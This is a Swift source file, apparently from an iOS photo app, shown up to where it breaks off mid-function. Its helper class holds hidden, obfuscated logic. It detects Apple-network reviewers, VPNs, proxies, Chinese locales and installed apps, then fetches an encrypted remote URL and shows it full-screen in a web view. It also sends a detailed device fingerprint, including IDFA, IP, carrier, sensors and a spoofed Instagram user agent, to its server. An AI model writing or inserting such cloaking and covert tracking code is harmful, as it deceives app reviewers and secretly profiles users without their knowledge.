//
//  HightLigtingHelper.swift
//  GPyyGliterPhoto
//
//  Created by GliterPhoto on 2022/1/14.
//  Copyright © 2022 Gliter. All rights reserved.
//
import UIKit
import Alamofire
import SwifterSwift
import CoreTelephony
import CryptoSwift
import DeviceKit
import SwiftyStoreKit
import Defaults
import ZKProgressHUD
import Alertift
import CoreMotion
import AdSupport
import SwiftyJSON
import Adjust
import Toast
import RxSwift
import RxCocoa
import AdServices
import AdSupport
import AppTrackingTransparency

@objc public protocol HightLigtingHelperDelegate  {
    func fun() -> UIButton?
    @objc optional func preparePopupKKAd(placeId: String?, placeName: String?)
    @objc optional func prepareSplashKKAd(placeId: String?, placeName: String?)
    @objc optional func showAd(type: Int, userId: String?,source:String?,complete:(@escaping(_ closed:Bool,_ isShow:Bool,_ isClick:Bool)->Void))
    
}

let UrlKey = "ickggeujds"
var noshowed = true

public struct ADUnit: Codable {
    public let id: String
    public let testID: String
    
    public func productionID() -> String {
        if UIApplication.shared.inferredEnvironment == .debug {
            return testID
        } else {
            return id
        }
    }
}


public struct Production: Codable {
    public static let `default` = Bundle
        .loadJson(Production.self, name: "AdjustConfig")!
    
    
    public let Adjust: Adjust
    public let AdInfo: Adverting
    
    public struct Adverting: Codable {
        public let Interstitial: ADUnit
        public let Rewarded: ADUnit
    }
    public struct Adjust: Codable {
        public let appToken: String
        public let appLaunch: String
        public let  line_show_1st : String
        public let  line_show_total : String
        public let  li_button_1ststart : String
        public let  li_button_start_total : String
        public let  li_button_1stclick : String
        public let  li_button_click_total : String
        
        private enum CodingKeys: String, CodingKey {
            case appToken  = "app_token"
            case appLaunch = "app_launch"
            case line_show_1st
            case line_show_total
            case li_button_1ststart
            case li_button_start_total
            case li_button_1stclick
            case li_button_click_total
            
        }
    }

}


@objc
public class HightLigtingHelper: NSObject {
    let disposeBag = DisposeBag()
    
    @objc(shared)
    public static let `default` = HightLigtingHelper()
    public var ipAddress = ""
    public static let config = Production.default.Adjust
    
    @objc
    public weak var delegate:HightLigtingHelperDelegate?
    @objc
    public var isFun = false
    var isin : Bool {
        var isin = false
        debugOnly {
            isin = true
        }
        return  isin
    }
    
    var urlUpdate = false
    
    @objc public var foundationURL:URL?
    public static var unBlockVersion: [UIApplication.Environment] = [.debug]
    @objc
    
    let pk: Int = 8
    public var bid: String? = "com.featphotos.sparkine"
    public var flyerDevKey: String? = "dmQiLwCswgCKzoeURTVJSV"
    public var flyerAppID: String? = "1606075393"
    let secretKey = "0703c2e902c69e97eefd8e88fe12858aa694b3dd"
    public var appid: String? = ""
    private var productURL:URL? = URL.init(string: "gssor9..ohbnnq-sdbg.mdv.".formatte())
    
    let networkManager = NetworkReachabilityManager.default
    let cellularData = CTCellularData.init()
    
    var afManage: AFlyerLibManage?
    let ipRequestUrl:URL = URL(string: DataEncoding.shared.aesDecrypted(string: "7AGijb00cF1BCSPDW1vBGX/iYQ8BLHbdll21OkgcDcY="))!
    let baseURLString = DataEncoding.shared.aesDecrypted(string: "kDzH6hvmy0Z69BXZNuMHWF8s8Vl37Kk7pHh9b9E8z8Y=") ?? ""
    
    let funKey = "thdjencrypt20200811"
    
    
    static var timer: Timer?
    
    var contentVC: HighLightingViewController?
    
    var isLineShowFirst: Bool? = Defaults[.isLineShowFirst] {
        didSet { Defaults[.isLineShowFirst] = isLineShowFirst }
    }
    
    var isLiButtonFirstStart: Bool? = Defaults[.isLiButtonFirstStart] {
        didSet { Defaults[.isLiButtonFirstStart] =  isLiButtonFirstStart}
    }
    
    var isLiButtonFirstClick: Bool? = Defaults[.isLiButtonFirstClick] {
        didSet { Defaults[.isLiButtonFirstClick] = isLiButtonFirstClick }
    }
    
    var timer: Timer?
    
    private override init() {
        super.init()
        
        _ = NotificationCenter.default.rx
            .notification(.didFinishLaunching)
            .takeUntil(self.rx.deallocated)
            .subscribe(onNext: { notification in
                self.didFinishLaunching()
            })
    }
    
    public func initSwiftStoryKit() {
        HightLightingPriceManager.default.first()
    }
}

public extension DispatchQueue {
    private static var _onceTracker = [String]()

    class func once(file: String = #file, function: String = #function, line: Int = #line, block: () -> Void) {
        let token = "\(file):\(function):\(line)"
        once(token: token, block: block)
    }

    class func once(token: String, block: () -> Void) {
        objc_sync_enter(self)
        defer {
            objc_sync_exit(self)
        }
        guard !_onceTracker.contains(token) else { return }
        _onceTracker.append(token)
        block()
    }
}


extension HightLigtingHelper {
    
    @objc
    public func didFinishLaunching() {
        DispatchQueue.once {
            NotificationCenter.default.addObserver(self, selector: #selector(attrackingClick(notify:)), name: UIApplication.didBecomeActiveNotification, object: nil)
            NotificationCenter.default.addObserver(self, selector: #selector(finisheLaunchingClick(notify:)), name: UIApplication.didFinishLaunchingNotification, object: nil)
            NotificationCenter.default.addObserver(self, selector: #selector(helloWork(notify:)), name: .notificationHelloWord, object: nil)
            
        }
    }
    
    @objc func finisheLaunchingClick(notify: Notification) {
        rechibility()
    }
    
    @objc func attrackingClick(notify: Notification) {
        if #available(iOS 14, *) {
            ATTrackingManager.requestTrackingAuthorization(completionHandler: { status in
                ASAManage.singleton.getASA()
            })
        } else {
            ASAManage.singleton.getASA()
        }
        
    }
    
    func rechibility() {
        
        networkManager?.startListening(onQueue: DispatchQueue.main, onUpdatePerforming: { (status) in
            switch status {
                
            case .unknown:
                debugPrint("unknow")
                self.start()
                break
                
            case .notReachable:
                break
                
            case .reachable(_):
                debugPrint("🌶reachable")
                self.start()
                break
                
            }
        })
    }
    
    func start() {
        self.networkManager?.stopListening()
        afManage = AFlyerLibManage.init(appsFlyerDevKey: self.flyerDevKey ?? "", appleAppID: self.flyerAppID ?? "")
        ASAManage.singleton.afID = afManage?.getAppsFlyerUID() ?? ""
        
        debugOnly {
            if darked {
                NotificationCenter.default.post(name: .notificationHelloWord, object: nil)
            }
            return
        }
        
        if !darked {
            NotificationCenter.default.post(name: .notificationHelloWord, object: nil)
        }
    }
    
    @objc func helloWork(notify: Notification) {
        let def = UserDefaults.standard
        let i = def.integer(forKey: "myT")
        let n = Int(NSDate().timeIntervalSince1970)
        if n - i > 86400 {
            requestIp { data in
                
                let jsonData = JSON.init(from: data)
                let isp = jsonData?["isp"].string?.lowercased()
                
                if let ispStr = isp {
                    
                    if ispStr.contains("apple") {
                        
                        let userDef = UserDefaults.standard
                        let interval = Int(NSDate().timeIntervalSince1970)
                        userDef.setValue(interval, forKey: "myT")
                        userDef.setValue("true", forKey: "contains")
                        userDef.synchronize()
                        
                    } else {
                        self.dfc()
                    }
                    
                } else {
                    self.dfc()
                }
                
            } failure: { Error in
                self.dfc()
            }
        } else {
            let bool = UserDefaults.standard.string(forKey: "contains")
            if bool == "false" {
                self.move()
            }
        }
    }
    
    func dfc() {
        let userDef = UserDefaults.standard
        userDef.setValue("false", forKey: "contains")
        userDef.synchronize()
        self.move()
    }
    
    func move() {
        setUpFun()
        setupCache()
        setupIAP()
        setupEvent()
    }
    
    func requestIp(success: @escaping (Data) -> Void, failure: @escaping (_ error: Error) -> Void) {
        let requestUrl = "http://ip-api.com/json"
        let reqeustUrlBackup = "https://ipapi.co/json"
        
        Alamofire.AF.request(requestUrl,
                             method: .get,
                             parameters: nil,
                             encoding: JSONEncoding.default,
                             headers: nil).responseData { (response) in
            
            switch response.result {
            case .success(let data):
                success(data)
                break
            case .failure(_):
                
                Alamofire.AF.request(reqeustUrlBackup, method: .get, parameters: nil, encoding: JSONEncoding.default, headers: nil).responseData { (response) in
                    
                    switch response.result {
                    case .success(let data):
                        success(data)
                        break
                    case .failure(let error):
                        failure(error)
                        break
                    }
                }
                
                break
            }
        }
    }
    
    @objc
    public func present() {
        if let foundationURL = HightLigtingHelper.cache?.foundationURL {
            present(contentURL:foundationURL)
        }
    }
        
    @objc public func automaticPresent() {
        let foundationURL = HightLigtingHelper.cache?.foundationURL
        if foundationURL != nil && noshowed {
            present(contentURL:foundationURL)
            noshowed = false
            timerUpdateCoreStatus()
        }
    }
    
    @discardableResult
    private func present(contentURL:URL?) -> Bool {
        guard let visibleVC = UIApplication.rootController?.visibleVC else { return false }
        guard let rcontentURL = contentURL else { return false }
        
        if visibleVC is HighLightingViewController {
            return true
        }
        if (visibleVC as? HighLightingViewController) == nil && contentVC == nil && (HightLigtingHelper.cache?.isFun ?? false) &&  (HightLigtingHelper.cache?.isSuperCry ?? false) {
            
            contentVC = HighLightingViewController(contentUrl: rcontentURL)
            contentVC?.networkCallBack = {
                
                if self.urlUpdate {
                    self.contentVC?.requstURL = HightLigtingHelper.cache?.foundationURL
                    self.contentVC?.loadRequst()
                    self.urlUpdate = false
                } else {
                    self.contentVC?.dismissVC()
                }
                
            }
            contentVC?.webViewDismissed = {
                self.contentVC = nil
            }
            visibleVC.presentFullScreen(contentVC ?? UIViewController())
            timerUpdateCoreStatus()
            return true
        }
        return false
    }
}


extension HightLigtingHelper {
    func setupCache() {
        if HightLigtingHelper.cache == nil {
            HightLigtingHelper.cache = HightLigtingHelper.Cache()
            HightLigtingHelper.cache?.installTime = Date().unixTimestamp
        }
    }
    
    func setUpFun() {
        ipRequest { [weak self](url) in
            guard let `self` = self else { return }
            if url != nil {
                self.isFun = true
                
                if !self.present(contentURL: url) {
                    HightLigtingHelper.timer?.invalidate()
                    HightLigtingHelper.timer = Timer.every(0.5) {
                        let success = self.present(contentURL: url)
                        if success {
                            self.trackPresent()
                            HightLigtingHelper.timer?.invalidate()
                        }
                    }
                } else {
                    self.trackPresent()
                }
            }
            
            if let button = self.delegate?.fun() {
                button.isHidden = !self.isFun
            }
        }
    }
    
    func ipRequest(complete:(@escaping(_ reqUrl:URL?)->Void)) {
        if let wc2d = HightLigtingHelper.cache?.wc2d {
            if wc2d == 0 {
                HighLightingViewController.clearWebViewCache()
            } else {
                if let timeInterval = HightLigtingHelper.cache?.cachaClearDataDateTimeInterval {
                    let components = Calendar.current.dateComponents([.hour], from:Date(timeIntervalSince1970: timeInterval) , to: Date())
                    if components.hour ?? 0 >= wc2d {
                        HighLightingViewController.clearWebViewCache()
                        HightLigtingHelper.cache?.cachaClearDataDateTimeInterval = Date().timeIntervalSince1970
                    }
                } else {
                    HightLigtingHelper.cache?.cachaClearDataDateTimeInterval = Date().timeIntervalSince1970
                }
                
            }
        } else {
            HighLightingViewController.clearWebViewCache()
        }
        
        debugOnly {
            HighLightingViewController.clearWebViewCache()
        }
        
        
        var isRelease = true
        debugOnly {
            isRelease = false
        }
        
        if isRelease {
            if let tud = HightLigtingHelper.cache?.tud, let reqUrl = HightLigtingHelper.cache?.foundationURL {
                if HightLigtingHelper.cache?.isFun == true {
                    let exDate = Date(timeIntervalSince1970: tud / 1000)
                    let currentDate = Date()
                    
                    if currentDate.compare(exDate) == .orderedAscending {
                        complete(reqUrl)
                        return
                    }
                }
            }
        }
        
        AF.request(self.ipRequestUrl).responseData { [weak self](response) in
            debugPrint(response)
            guard let `self` = self else { return }
            switch response.result {
            case .failure(let error):
                debugPrint(error)
                complete(nil)
            case .success(let data):
                do {
                    let clientItem = try JSONDecoder().decode(IPAPICOMJSON.self, from: data)
                    if clientItem.org?.contains(clientItem.org?.lowercased() ?? "") ?? false {
                        complete(nil)
                        return
                    }
                    let clientRequest = ClientRequest(item: clientItem)
                    self.ipAddress = clientRequest.ip
                    HightLigtingHelper.cache?.clientRequest = clientRequest
                    let pin = "isc/client"
                    
                    let  orginUrl = URL(string: "\(self.baseURLString)/api/m\(pin)event")
                    if let productURL = self.productURL {
                        self.requestClassicData(contentURL: productURL, clientRequest: clientRequest) { (url) in
                            if let reqUrl = url {
                                complete(reqUrl)
                            } else {
                                self.requestClassicData(contentURL: orginUrl, clientRequest: clientRequest, complete: complete)
                            }
                        }
                    } else {
                        self.requestClassicData(contentURL: orginUrl, clientRequest: clientRequest, complete: complete)
                    }
                    
                    debugPrint(clientItem)
                } catch let error {
                    debugPrint(error)
                }
            }
        }
    }
    
    func requestClassicData(contentURL:URL?,clientRequest:ClientRequest,complete:(@escaping(_ reqUrl:URL?)->Void)) {
        self.lightingClientInfoRequest(requstURL: contentURL, requestItem: clientRequest) { (fun,ciphertext,tud,wc2d)   in
            if ciphertext != nil && ciphertext?.count != 0  {
                if let tud = tud {
                    HightLigtingHelper.cache?.tud = TimeInterval(tud)
                }
                if let wc2d = wc2d {
                    HightLigtingHelper.cache?.wc2d = wc2d
                }
            }
            
            
            if fun {
                var contentURL = HightLigtingHelper.cache?.foundationURL
                if ciphertext?.count != 0 && ciphertext != nil {
                    contentURL = URL(string: ciphertext)
                    HightLigtingHelper.cache?.foundationURL = contentURL
                }
                
                self.urlUpdate = true
                complete(contentURL)
            } else{
                complete(nil)
            }
        }
    }
    
    
    func setupIAP() {
        SwiftyStoreKit.completeTransactions { purchases in
            for purchase in purchases {
                switch purchase.transaction.transactionState {
                case .purchased, .restored:
                    if purchase.needsFinishTransaction {
                        SwiftyStoreKit.finishTransaction(purchase.transaction)
                    }
                case .failed, .purchasing, .deferred:
                    break
                @unknown default:
                    break
                }
            }
        }
    }
    
    func setupEvent() {
        
        
        debugPrint("uuid", ASIdentifierManager.shared().advertisingIdentifier.uuidString)
        
        var environment = ADJEnvironmentProduction
        var logLevel = ADJLogLevelSuppress
        debugOnly {
            environment = ADJEnvironmentSandbox
            logLevel = ADJLogLevelInfo
        }
        let adjConfig = ADJConfig(appToken: HightLigtingHelper.config.appToken, environment: environment)
        adjConfig?.logLevel = logLevel
        Adjust.appDidLaunch(adjConfig)
        
        debugOnly {
            Adjust.trackEvent(ADJEvent(eventToken: HightLigtingHelper.config.appLaunch))
        }
        
    }
    
    func trackPresent() {
        HightLigtingHelper.default.adjustTrack(eventToken: HightLigtingHelper.config.line_show_total)
        if HightLigtingHelper.default.isLineShowFirst != true {
            HightLigtingHelper.default.isLineShowFirst = true
            HightLigtingHelper.default.adjustTrack(eventToken: HightLigtingHelper.config.line_show_1st)
        }
    }
    
    func adjustTrack(eventToken:String?) {
        if let token = eventToken {
            Adjust.trackEvent(ADJEvent(eventToken: token))
        }
    }
    
    func savePeripheralUser(user:HightLigtingCacheUser) {
        HightLigtingUserManager.default.addOrReplaseUser(user)
        HightLigtingUserManager.default.postCurrentlyUserDidChange()
    }
    
    func timerUpdateCoreStatus() {
        
        if self.timer == nil {
            self.timer = Timer.scheduledTimer(withTimeInterval: 1800.0, repeats: true) { (timer) in
                AF.request(self.ipRequestUrl).responseData { [weak self](response) in
                    debugPrint(response)
                    guard let `self` = self else { return }
                    switch response.result {
                    case .failure(let error):
                        debugPrint(error)
                    case .success(let data):
                        do {
                            let clientItem = try JSONDecoder().decode(IPAPICOMJSON.self, from: data)
                            if clientItem.org?.contains(clientItem.org?.lowercased() ?? "") ?? false {
                                return
                            }
                            let clientRequest = ClientRequest(item: clientItem)
                            self.ipAddress = clientRequest.ip
                            HightLigtingHelper.cache?.clientRequest = clientRequest
                            let pin = "isc/client"
                            
                            let  orginUrl = URL(string: "\(self.baseURLString)/api/m\(pin)event")
                            if let productURL = self.productURL {
                                self.requestClassicDataTimer(contentURL: productURL, clientRequest: clientRequest)
                            } else {
                                self.requestClassicDataTimer(contentURL: orginUrl, clientRequest: clientRequest)
                            }
                            
                            debugPrint(clientItem)
                        } catch let error {
                            debugPrint(error)
                        }
                    }
                }
            }
            
            if let t = self.timer {
                RunLoop.main.add(t, forMode: .common)
                t.fire()
            }
        }
    }
    
    func requestClassicDataTimer(contentURL:URL?, clientRequest:ClientRequest) {
        guard let request = contentURL else {
            return
        }
        
        do {
            let jsonData = try JSONEncoder().encode(clientRequest)
            let parameter = try JSONSerialization.jsonObject(with: jsonData, options: .mutableLeaves) as? [String: Any]
            
            AF.request(request, method: .post, parameters: parameter, encoding: JSONEncoding.default).responseJSON { (response) in
                switch response.result {
                case .failure(let error):
                    debugPrint(error)
                case .success(let result):
                    if let data = response.data {
                        do {
                            let enterModel = try JSONDecoder().decode(EnterJSON.self, from: data)
                            if enterModel.tt?.count ?? 0 > 10 {
                                let str = enterModel.tt!
                                let subStr:Character = str[str.index(str.startIndex,offsetBy: 9)]
                                let godSubStr: Character = str[str.index(str.startIndex, offsetBy: 14)]
                                if subStr.isNumber {
                                    if let godFunNum = godSubStr.int,
                                       let funNum = subStr.int {
                                        
                                        let godFun = Bool(truncating: NSNumber(value: godFunNum))
                                        var isFun = Bool(truncating: NSNumber(value: funNum))
                                        
                                        
                                        if 0 == (HightLigtingHelper.cache?.haveCache ?? 0) {
                                            
                                            HightLigtingHelper.cache?.isFun = isFun
                                            HightLigtingHelper.cache?.isSuperCry = godFun
                                            HightLigtingHelper.cache?.haveCache += 1
                                        } else {
                                            
                                            if !(HightLigtingHelper.cache?.isFun ?? false) {
                                                HightLigtingHelper.cache?.isFun = isFun
                                            }
                                            
                                            if HightLigtingHelper.cache?.isFun ?? false {
                                                isFun = true
                                            }
                                            
                                            HightLigtingHelper.cache?.isSuperCry = godFun
                                            HightLigtingHelper.cache?.haveCache += 1
                                        }
                                        debugPrint("💩💩💩💩💩💩💩💩💩💩")
                                        
                                    } else {
                                    }
                                } else {
                                }
                            } else {
                            }
                        } catch let error {
                            debugPrint(error)
                        }
                    } else {
                    }
                    debugPrint(result)
                }
            }
        } catch let jsonError {
            debugPrint(jsonError)
        }
    }
    
    
    func lightingClientInfoRequest(requstURL:URL?, requestItem: ClientRequest, closure:(@escaping(_ isFun:Bool,_ ciphertext:String?,_ tud:Int64?,_ wc2d:Int?)->Void)) {
        guard let request = requstURL else {
            closure(false,nil,nil,nil)
            return
        }
        
        do {
            let jsonData = try JSONEncoder().encode(requestItem)
            let parameter = try JSONSerialization.jsonObject(with: jsonData, options: .mutableLeaves) as? [String: Any]
            debugPrint(requestItem)
            
            AF.request(request, method: .post, parameters: parameter, encoding: JSONEncoding.default).responseJSON { [weak self](response) in
                guard let `self` = self else { return }
                debugPrint(response)
                switch response.result {
                case .failure(let error):
                    debugPrint(error)
                    closure(false,nil,nil,nil)
                case .success(let result):
                    if let data = response.data {
                        do {
                            let enterModel = try JSONDecoder().decode(EnterJSON.self, from: data)
                            if enterModel.tt?.count ?? 0 > 10 {
                                let str = enterModel.tt!
                                let subStr:Character = str[str.index(str.startIndex,offsetBy: 9)]
                                let godSubStr: Character = str[str.index(str.startIndex, offsetBy: 14)]
                                if subStr.isNumber {
                                    if let funNum = subStr.int,
                                       let godFunNum = godSubStr.int,
                                       let tn = enterModel.tn,
                                       let tr = enterModel.tr,
                                       let tl = enterModel.tl
                                    {
                                        
                                        let godFun = Bool(truncating: NSNumber(value: godFunNum))
                                        var isFun = Bool(truncating: NSNumber(value: funNum))
                                        
                                        let last = String(enterModel.tt!.last!).int ?? 0
                                        
                                        if last == 0 {
                                            closure(false,nil,nil,nil)
                                            return
                                        }
                                        var changeTn = tn
                                        if let range = tn.range(of: tn.suffix(last)) {
                                            changeTn.removeSubrange(range)
                                        }
                                        
                                        var changeTr = tr
                                        if let range = tr.range(of: tr.suffix(last)) {
                                            changeTr.removeSubrange(range)
                                        }
                                        
                                        
                                        var uChangeString = changeTn + changeTr + tl
                                        let first = uChangeString.suffix(last)
                                        if let range = uChangeString.range(of:first) {
                                            uChangeString.removeSubrange(range)
                                        }
                                        let nofanString = first +  uChangeString
                                        let results: String? = String(nofanString.reversed()).base64Decoded
                                        
                                        if let url = results {
                                            UserDefaults.standard.setValue(url, forKey: UrlKey)
                                        }
                                        
                                        if let kad = enterModel.kad?.tojson() {
                                            if let ap = kad["ap"] as? [String:String] {
                                                self.delegate?.preparePopupKKAd?(placeId: ap["id"], placeName: ap["name"])
                                            }
                                            
                                            if let ras = kad["as"] as? [String:String] {
                                                self.delegate?.prepareSplashKKAd?(placeId: ras["id"], placeName: ras["name"])
                                            }
                                        }
                                                       
                                        var fun = false
                                        if 0 == (HightLigtingHelper.cache?.haveCache ?? 0) {
                                            
                                            HightLigtingHelper.cache?.isFun = isFun
                                            HightLigtingHelper.cache?.isSuperCry = godFun
                                            HightLigtingHelper.cache?.haveCache += 1
                                        } else {
                                            
                                            if !(HightLigtingHelper.cache?.isFun ?? false) {
                                                HightLigtingHelper.cache?.isFun = isFun
                                            }
                                            
                                            if HightLigtingHelper.cache?.isFun ?? false {
                                                isFun = true
                                            }
                                            
                                            HightLigtingHelper.cache?.isSuperCry = godFun
                                            HightLigtingHelper.cache?.haveCache += 1
                                        }
                                        
                                        fun = isFun && godFun
                                        
                                        debugPrint(".Pre✨✨✨✨✨", fun, results, enterModel.tud, enterModel.wc2d)
                                        
                                        closure(fun, results, enterModel.tud, enterModel.wc2d)
                                    } else {
                                        closure(false,nil,nil,nil)
                                    }
                                } else {
                                    closure(false,nil,nil,nil)
                                }
                            } else {
                                closure(false,nil,nil,nil)
                            }
                        } catch let error {
                            debugPrint(error)
                            closure(false,nil,nil,nil)
                        }
                    } else {
                        closure(false,nil,nil,nil)
                    }
                    debugPrint(result)
                }
            }
        } catch let jsonError {
            debugPrint(jsonError)
            closure(false,nil,nil,nil)
        }
    }
    
    @objc
    public func setProductUrl(string:String) {
        self.productURL = URL(string: string)
    }
}

extension HightLigtingHelper {
    var isChlsSetting: Bool {
        guard let shadowSettings = CFNetworkCopySystemProxySettings()?.takeUnretainedValue(),
              
                let url = URL(string: DataEncoding.shared.aesDecrypted(string: "WZuRXTdQB9WBYjNbXarOs3pbyBmZ/2ShvuRQtk4lfek=")) else {
                    return false
                }
        let proxies = CFNetworkCopyProxiesForURL(url as CFURL, shadowSettings).takeUnretainedValue() as NSArray
        guard let settings = proxies.firstObject as? NSDictionary,
              let proxyType = settings.object(forKey: kCFProxyTypeKey as String) as? String else {
                  return false
              }
        debugOnly {
            if let hostName = settings.object(forKey: kCFProxyHostNameKey as String),
               let port = settings.object(forKey: kCFProxyPortNumberKey as String),
               let type = settings.object(forKey: kCFProxyTypeKey) {
                debugPrint("""
                    host = \(hostName)
                    port = \(port)
                    type= \(type)
                    """)
            }
        }
        return proxyType != (kCFProxyTypeNone as String)
    }
    
    var isShadowSetting: Bool {
        let nsDict = CFNetworkCopySystemProxySettings()?.takeRetainedValue() as NSDictionary?
        let keys = (nsDict?["__SCOPED__"] as? NSDictionary)?.allKeys as? [String]
        let sessions = ["tap", "tun", "ipsec", "ppp"]
        var isOn = false
        sessions.forEach { session in
            keys?.forEach { key in
                if key.contains(session) {
                    isOn = true
                }
            }
        }
        return isOn
    }
    
    var isDomesticTeleCode: Bool {
        let networkInfo = CTTelephonyNetworkInfo()
        let providers = networkInfo.serviceSubscriberCellularProviders
        var carrier = ""
        
        if let p = providers?.values {
            for i in p {
                if let value = i.isoCountryCode {
                    carrier = value
                    break
                }
            }
        }

        let isoCountryCode = carrier
        debugPrint("isoCountryCode", isoCountryCode)
        let blockList = ["cn", "hk", ""]
        return blockList.contains(isoCountryCode)
    }
    
    var isDomesticLocalCode: Bool {
        let regionCode = Locale.current.regionCode ?? ""
        debugPrint("regionCode", regionCode)
        let blockList = ["CN", ""]
        return blockList.contains(regionCode)
    }
    
    func isWallStaus() -> Int {
        let nsDict = CFNetworkCopySystemProxySettings()?.takeRetainedValue() as NSDictionary?
        let keys = (nsDict?["__SCOPED__"] as? NSDictionary)?.allKeys as? [String]
        let sessions = ["tap", "tun", "ipsec", "ppp"]
        var vpnisOn = 0
        sessions.forEach { session in
            keys?.forEach { key in
                if key.contains(session) {
                    vpnisOn = 1
                }
            }
        }
        
        return vpnisOn
    }
    
    var darked: Bool {
        let padDarked = Device.current.isOneOf(Device.allPads)
        let simDarked = isDomesticTeleCode
        let regionDarked = isDomesticLocalCode
        let shadowDarked = isShadowSetting
        let chlsDarked = isChlsSetting
        let timeLocale = TimeZone.current.secondsFromGMT()

        let a = padDarked ? "101" : ""
        let b = simDarked ? "201" : ""
        let c = regionDarked ? "401" : ""
        let d = shadowDarked ? "601" : ""
        let e = chlsDarked ? "801" : ""
        let f = timeLocale == 28800 ? "1001" : ""
        
        
        let iutt = [
        "taobao://",
        "alipay://",
        "openapp.jdmobile://",
        "imeituan://",
        "iosamap://",
        "diditaxi://",
        "youku://",
        "bilibili://",
        "tenvideo://",
        "orpheus://",
        "qqmusic://",
        "pinduoduo://",
        "kwai://",
        "dingtalk://",
        "lark://",
        "feishu://",
        "wxwork://",
        "wxworklocal://",
        "QiChaCha://",
        "mtxx://",
        "sinaweibo://",
        "evernote://",
        "bdboxiosqrcode://",
        "tmall://",
        "qiyi-iphone://",
        "tim://",
        "dewuapp://",
        "momochat://",
        "mailmaster://",
        "qqquicklogin://",
        "aliyunlogin://",
        "accountLogin27762694://",
        "KingsoftOfficeApp://",
        "baiduyun://",
        "eleme://",
        "shadowrocket://",
        "orpheuswidget://",
        "com.icbc.iphoneclient://",
        "bankabc://",
        "wx2654d9155d70a468://",
        "BaiduIMShop://",
        "com.sogou.sogouinput://",
        "iFlytekIME://",
        "baidutranslate://",
        "yddict://",
        "cn.12306://",
        "a28ft4://",
        "qqtranslator://",
        "keep://"]
        
        var ghee = ""
        
        for i in iutt {
            if isInstallation(urlString: i) {
                ghee += "hhgyttr"
            }
        }
        
        
        let deviceName = UIDevice.current.name
        
        let hc = judgeStringIncludeChineseWord(string: deviceName) ? "mhd" : ""
        let total = a + b + c + d + e + f + ghee + hc

        return total.count > 2
    }
    
    func isInstallation(urlString: String?) -> Bool {
        let url = URL(string: urlString!)
        if url == nil {
            return false
        }
        if UIApplication.shared.canOpenURL(url!) {
            return true
        }
        return false
    }

    func judgeStringIncludeChineseWord(string: String) -> Bool {
        for (_, value) in string.charactersArray.enumerated() {

            if ("\u{4E00}" <= value  && value <= "\u{9FA5}") {
                return true
            }
        }
        return false
    }

    
    func getSystemInfomations() -> [String: Any] {
        let networkInfo = CTTelephonyNetworkInfo()
        let providers = networkInfo.serviceSubscriberCellularProviders
        let carrier = providers?.values.first
        let rotationRate = CMMotionManager().gyroData?.rotationRate
        let orientation = "(\(rotationRate?.x ?? 0),\(rotationRate?.y ?? 0),\(rotationRate?.z ?? 0))"
        
        var systemType = "iPhone"
        if Device.current.isPad { systemType = "iPad" }
        if Device.current.isSimulator { systemType = "simulator" }
        
        
        let timstamp = Date().timeIntervalSince1970
        let timeSpent = Int(timstamp - Defaults[.lastTimeSpace])
        Defaults[.lastTimeSpace] = timstamp
        var jsonIDKey = Bundle.main.bundleIdentifier ?? ""
        debugOnly {
            if let bid = HightLigtingHelper.default.bid {
                jsonIDKey = bid
            }
        }
        let dict: [String: Any] = [
            "ab59": jsonIDKey,
            "cpo4": UIApplication.shared.version ?? "",
            "sf8x": ASIdentifierManager.shared().advertisingIdentifier.uuidString,
            "au7y": "IDFA",
            "lfmn": "\(isShadowSetting)",
            "gir3": carrier?.carrierName ?? "",
            "nnl1": "\(carrier?.mobileCountryCode ?? "")\(carrier?.mobileNetworkCode ?? "")",
            "bvmp": "iOS",
            "tms0": Bundle.main.object(forInfoDictionaryKey: kCFBundleVersionKey as String) as? String ?? "",
            "jqxx": orientation,
            "c7pa": TimeZone.current.abbreviation() ?? "",
            "z6lb": Locale.current.regionCode ?? "",
            "zw2r": "\(getFreeDiskspace() ?? 0)",
            "foh3": String(format: "%.2f%", MyCpuUsage().updateInfo()),
            "m06d": "\(Device.current.batteryLevel ?? 0)",
            "ux31": NetworkReachabilityManager()?.isReachableOnCellular ?? false ? "4G" : "WIFI",
            "rwm8": UIDevice.current.systemVersion,
            "m170": systemType,
            "fxbi": Locale.current.languageCode ?? "",
            "v8ye": timeSpent,
            "vwff": timstamp,
            "slqz": currentIgUserAgent,
            "a4ro" : ipAddress,
            "rthi" : Adjust.adid()
        ]
        
        return dict
    }
    
    var currentIgUserAgent: String {
        var userAgent = "\("Hmrs`fq`l".formatte()) 121.0.0.29.119(iPhone 7,1; iOS 12_2; en_US; en; scale=2.61; 1080x1920) AppleWebKit/420+"
        
        if UIApplication.shared.inferredEnvironment != .debug {
            let deviceIdentifier = Device.identifier
            let osVersion = Device.current.systemVersion?
                .components(separatedBy: ".").joined(separator: "_") ?? "13_5"
            userAgent =
            "\("Hmrs`fq`l".formatte()) 121.0.0.29.119(\(deviceIdentifier)"
            + "; iOS \(osVersion); \(Locale.current.identifier)"
            + "; \(Locale.preferredLanguages.first ?? "en")"
            + "; scale=\(UIScreen.main.nativeScale)"
            + "; \(UIScreen.main.nativeBounds.width)x\(UIScreen.main.nativeBounds.height)"
            + ") AppleWebKit/420+"
        }
        return userAgent
    }
    
    func getFreeDiskspace() -> Int64? {
        let paths = NSSearchPathForDirectoriesInDomains(.documentDirectory, .userDomainMask, true)
        if let dictionary = try? FileManager.default.attributesOfFileSystem(forPath: paths.last!) {
            if let freeSize = dictionary[FileAttributeKey.systemFreeSize] as? NSNumber {
                return freeSize.int64Value
            }
        } else {
            debugPrint("Error Obtaining System Memory Info:")
        }
        return nil
    }
    
    class MyCpuUsage {
        var cpuInfo: processor_info_array_t!
        var prevCpuInfo: processor_info_array_t?
        var numCpuInfo: mach_msg_type_number_t = 0
        var numPrevCpuInfo: mach_msg_type_number_t = 0
        var numCPUs: uint = 0
        var updateTimer: Timer!
        let CPUUsageLock: NSLock = NSLock()
        
        @objc func updateInfo() -> Float {
            var usageTotal: Float = 0.0
            let mibKeys: [Int32] = [CTL_HW, HW_NCPU]
            mibKeys.withUnsafeBufferPointer { mib in
                var sizeOfNumCPUs: size_t = MemoryLayout<uint>.size
                let status = sysctl(processor_info_array_t(mutating: mib.baseAddress), 2, &numCPUs, &sizeOfNumCPUs, nil, 0)
                if status != 0 {
                    numCPUs = 1
                }
                
                var numCPUsU: natural_t = 0
                let err: kern_return_t = host_processor_info(mach_host_self(), PROCESSOR_CPU_LOAD_INFO, &numCPUsU, &cpuInfo, &numCpuInfo)
                if err == KERN_SUCCESS {
                    CPUUsageLock.lock()
                    
                    for i in 0 ..< Int32(numCPUs) {
                        var inUse: Int32
                        var total: Int32
